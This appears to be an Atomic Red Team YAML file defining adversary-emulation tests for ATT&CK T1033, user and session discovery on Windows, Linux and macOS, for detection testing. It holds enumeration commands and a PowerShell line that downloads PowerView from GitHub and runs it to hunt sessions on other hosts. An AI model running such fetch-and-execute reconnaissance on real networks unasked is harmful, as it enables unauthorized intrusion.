attack_technique:
- T1033
display_name: System Owner/User Discovery
atomic_tests:
- name: System Owner/User Discovery
  description: "Identify System owner or users on an endpoint.\n\nUpon successful execution, cmd.exe will spawn multiple commands against a target host to identify usernames. Output will be via stdout. \nAdditionally, two files will be written to disk - computers.txt and usernames.txt.\n"
  supported_platforms:
  - windows
  input_arguments:
    computer_name:
      description: Name of remote computer
      type: string
      default: localhost
  executor:
    command: |
      cmd.exe /C whoami
      wmic useraccount get /ALL
      quser /SERVER:"#{computer_name}"
      quser
      qwinsta.exe" /server:#{computer_name}
      qwinsta.exe
      for /F "tokens=1,2" %i in ('qwinsta /server:#{computer_name} ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > usernames.txt
      @FOR /F %n in (computers.txt) DO @FOR /F "tokens=1,2" %i in ('qwinsta /server:%n ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > usernames.txt
    name: command_prompt
- name: System Owner/User Discovery
  description: |
    Identify System owner or users on an endpoint

    Upon successful execution, sh will stdout list of usernames.
  supported_platforms:
  - linux
  - macos
  executor:
    command: |
      users
      w
      who
    name: sh
- name: Find computers where user has session - Stealth mode (PowerView)
  description: Find existing user session on other computers. Upon execution, information about any sessions discovered will be displayed.
  supported_platforms:
  - windows
  executor:
    command: |
      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'); Invoke-UserHunter -Stealth -Verbose
    name: powershell

